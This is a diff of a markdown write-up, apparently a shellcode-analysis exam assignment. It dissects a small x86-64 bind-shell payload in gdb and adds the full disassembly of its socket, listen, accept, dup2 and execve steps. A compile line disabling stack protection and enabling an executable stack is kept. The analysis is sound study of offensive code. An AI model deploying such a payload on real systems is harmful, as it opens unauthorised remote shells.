@@ -75,7 +75,7 @@ Now it can be compiled:
 ```bash
 gcc -fno-stack-protector -z execstack Payload_02.c -o Payload_02
 ```
-When it's run, it shows the files of the directory:
+When it's run, is listens for incoming connections in a random port. From another terminal using `netstat` check what's the listening port, and with `netcat`, can connect. A shell is spawned:
 
 <img src="https://galminyana.github.io/img/A052_Shellcode_Run.png" width="75%" height="75%">
 
@@ -84,7 +84,7 @@ When it's run, it shows the files of the directory:
 Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the payload shellcode:
 
 ```asm
-SLAE64> objdump -M intel -D Payload_01
+SLAE64> objdump -M intel -D Payload_02
 **_REMOVED_**
 0000000000004060 <code>:
     4060:	48 31 f6             	xor    rsi,rsi
@@ -125,13 +125,70 @@ Per the disassembled code, a total of 5 syscalls been used. Let's see which ones
 - `sys_socket` : Value 0x29
 - `sys_listen` : Value 0x32
 - `sys_accept` : Value 0x2b
-- `sys_??????` : Value 0x21
+- `sys_dup2`   : Value 0x21
 - `sys_execve` : Value 0x3b
-
-
 
 ### The Fun: GDB Analysis
 ---
+As how the shellcode is disasembled, the code can be divided in sections. This sections are defined by the different syscalls. To simplify the analysis, we going to debug section by section.
+
+Let's load the exec file into `gdb`, setup the environment, and place a breakpoint in the code section with `b *&code`:
+
+```asm
+SLAE64> gdb ./Payload_02
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Reading symbols from ./Payload_02...(no debugging symbols found)...done.
+(gdb) 
+(gdb) set disassembly-flavor intel
+(gdb) b *&code
+Breakpoint 1 at 0x4060
+(gdb) 
+```
+Now can start debugging, let's `run` the program and `disassemble` it:
+```asm
+(gdb) run
+Starting program: /root/SLAE64/Exam/Assignment05/Payload_02 
+ShellCode Lenght: 57
+
+Breakpoint 1, 0x0000555555558060 in code ()
+(gdb) disassemble 
+Dump of assembler code for function code:
+=> 0x0000555555558060 <+0>:	xor    rsi,rsi
+   0x0000555555558063 <+3>:	mul    rsi
+   0x0000555555558066 <+6>:	inc    esi
+   0x0000555555558068 <+8>:	push   0x2
+   0x000055555555806a <+10>:	pop    rdi
+   0x000055555555806b <+11>:	mov    al,0x29
+   0x000055555555806d <+13>:	syscall 
+   0x000055555555806f <+15>:	push   rdx
+   0x0000555555558070 <+16>:	pop    rsi
+   0x0000555555558071 <+17>:	push   rax
+   0x0000555555558072 <+18>:	pop    rdi
+   0x0000555555558073 <+19>:	mov    al,0x32
+   0x0000555555558075 <+21>:	syscall 
+   0x0000555555558077 <+23>:	mov    al,0x2b
+   0x0000555555558079 <+25>:	syscall 
+   0x000055555555807b <+27>:	push   rdi
+   0x000055555555807c <+28>:	pop    rsi
+   0x000055555555807d <+29>:	xchg   rdi,rax
+   0x000055555555807f <+31>:	dec    esi
+   0x0000555555558081 <+33>:	mov    al,0x21
+   0x0000555555558083 <+35>:	syscall 
+   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
+   0x0000555555558087 <+39>:	push   rdx
+   0x0000555555558088 <+40>:	movabs rdi,0x68732f6e69622f2f
+   0x0000555555558092 <+50>:	push   rdi
+   0x0000555555558093 <+51>:	push   rsp
+   0x0000555555558094 <+52>:	pop    rdi
+   0x0000555555558095 <+53>:	mov    al,0x3b
+   0x0000555555558097 <+55>:	syscall 
+   0x0000555555558099 <+57>:	add    BYTE PTR [rax],al
+End of assembler dump.
+(gdb) 
+```
+All looks good, let's dissect the functionality.
+
+#### Section 1: `sys_socket`
 
 
 
